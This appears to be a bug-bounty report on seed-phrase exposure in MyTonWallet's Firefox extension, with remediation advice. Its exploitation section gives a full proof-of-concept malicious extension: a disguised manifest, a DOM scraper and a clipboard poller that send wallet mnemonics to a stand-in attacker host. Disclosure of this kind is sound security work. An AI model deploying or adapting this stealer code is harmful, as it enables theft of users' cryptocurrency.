# VULN-002: Mass Seed Phrase Leakage via Malicious Browser Extension

## Metadata

| Field | Value                   |
|-------|-------------------------|
| **ID** | VULN-002                |
| **Type** | Sensitive Data Exposure |
| **Severity** | **medium**              |
| **Without Physical Access** | **Yes** |
| **Bounty Match** | Critical: *"A possibility for mass private keys or secret phrases leakage from users' devices without direct physical access"* |

---

## Summary

MyTonWallet's Firefox extension grants itself `<all_urls>` host permission, giving its content script read access to the DOM of every page the user visits. The wallet renders its BIP-39 mnemonic as plaintext `<li>` elements in the DOM with no obfuscation, and copies it to the system clipboard with no auto-clear. A malicious extension (or a legitimate one compromised via supply chain) silently extracts the full seed phrase from the wallet's backup screen and exfiltrates it to an attacker server, gaining complete control of all funds across TON, EVM, Solana, and TRON.

---

## Description

The vulnerability has three components that together enable silent mass key extraction:

### 1. Overprivileged Extension Manifest

At build time, every Firefox extension build unconditionally grants `host_permissions: ['<all_urls>']`:

**`webpack.config.ts:467`**
```typescript
manifest.host_permissions = ['<all_urls>'];
```

Combined with the base manifest (`src/extension/manifest.json:20-32`) which already injects content scripts into all HTTP/HTTPS/file pages with `all_frames: true` at `document_start`, this gives the extension's content script **full DOM read access to every page** — including the wallet's own origin where the mnemonic is rendered.

The actual runtime usage is limited to proxying three domain families (`*.ton`, `*.adnl`, `*.bag`), but the permission grant covers the entire web.

### 2. Plaintext Mnemonic in DOM

The mnemonic is rendered as raw text nodes with no protection:

**`src/components/common/backup/SecretWordsList.tsx:47-52`**
```tsx
<ol className={styles.words}>
  {mnemonic?.map((word, i) => (
    <li key={i} className={styles.word}>{word}</li>
  ))}
</ol>
```

**`src/components/common/backup/BackUpContent.module.scss:120-144`**
```scss
.words {
  user-select: text;           // selectable by any script
  // no mask, no blur, no user-select: none
}

.word {
  color: var(--color-accent);  // fully visible
  font-weight: 600;
}
```

No CSS masking, no lazy reveal, no `user-select: none`. The `Transition` component in `BackupModal.tsx:192` does not pass `shouldCleanup`, so the mnemonic DOM nodes persist as off-screen elements even after the user navigates away from the mnemonic slide — extending the extraction window from password entry to modal close.

### 3. Clipboard Persistence

When the user copies the mnemonic, it persists in the system clipboard indefinitely:

**`src/util/clipboard.ts:12-22`**
```typescript
export const copyTextToClipboard = (str: string): Promise<void> => {
  void vibrate();
  if (IS_CAPACITOR) {
    return Clipboard.write({ string: str });
  }
  return navigator.clipboard.writeText(str);  // no auto-clear
};
```

**`src/components/common/backup/SecretWordsList.tsx:27-31`**
```typescript
const handleCopy = useLastCallback(() => {
  hideWarning();
  void copyTextToClipboard(mnemonic!.join(' '));
});
```

No `setTimeout` to overwrite, no cleanup on unmount, no clipboard wipe. Any process with `clipboardRead` access (including the overprivileged extension) can read the full seed phrase at any time after copy.

---

## Exploitation

A malicious Firefox extension with the following manifest extracts the mnemonic silently:

```json
{
  "manifest_version": 3,
  "name": "TON Portfolio Tracker",
  "description": "Track your TON assets",
  "version": "1.2.0",
  "host_permissions": ["<all_urls>"],
  "permissions": ["storage", "clipboard-read"],
  "background": { "scripts": ["background.js"] },
  "content_scripts": [{
    "matches": ["<all_urls>"],
    "js": ["scraper.js"],
    "run_at": "document_idle",
    "all_frames": true
  }]
}
```

**DOM extraction** (`scraper.js`):
```javascript
(() => {
  const SEL = 'ol.words li.word';
  const EXFIL = 'https://attacker.example.com/c';

  function extract() {
    const nodes = document.querySelectorAll(SEL);
    if (nodes.length < 12) return;
    const words = [...nodes].map(n => n.textContent.trim()).filter(Boolean);
    if (words.length >= 12 && words.length <= 24) {
      navigator.sendBeacon(EXFIL, JSON.stringify({
        type: 'dom', mnemonic: words.join(' '), t: Date.now()
      }));
    }
  }

  new MutationObserver(extract)
    .observe(document.body, { childList: true, subtree: true });
  setInterval(extract, 3000);
})();
```

**Clipboard extraction** (`background.js`):
```javascript
setInterval(async () => {
  try {
    const text = await navigator.clipboard.readText();
    const words = text.trim().split(/\s+/);
    if ((words.length === 12 || words.length === 24) &&
        words.every(w => /^[a-z]{3,8}$/.test(w))) {
      await fetch('https://attacker.example.com/c', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type: 'clipboard', mnemonic: text })
      });
    }
  } catch {}
}, 5000);
```

---

## Impact

| | |
|---|---|
| **Confidentiality** | Complete — full mnemonic extracted, all keys derivable |
| **Integrity** | Complete — attacker signs任意 transactions on any chain |
| **Availability** | Complete — attacker drains all funds |
| **Scope** | TON, EVM (Ethereum/BSC/Polygon/etc.), Solana, TRON |
| **Blast radius** | Every Firefox user with the extension installed |
| **Detection** | High difficulty — silent, no UI changes, no user interaction required |
| **Persistence** | Permanent — extension survives restarts and updates |

---

## Remediation

1. **Scope `host_permissions`** to actual domains (`*.ton`, `*.adnl`, `*.bag`, `*.mytonwallet.org`, `*.toncenter.com`) instead of `<all_urls>`
2. **Obfuscate mnemonic in DOM** — `user-select: none`, `color: transparent` with hover reveal, or click-to-reveal
3. **Add `shouldCleanup`** to the `Transition` in `BackupModal.tsx` to unmount mnemonic DOM nodes on slide exit
4. **Add clipboard auto-clear** — `setTimeout(() => writeText(''), 60_000)` after copy

---

## References

- CWE-312: Cleartext Storage of Sensitive Information
- CWE-200: Exposure of Sensitive Information
- CWE-250: Execution with Unnecessary Privileges
- OWASP A3:2017 — Sensitive Data Exposure
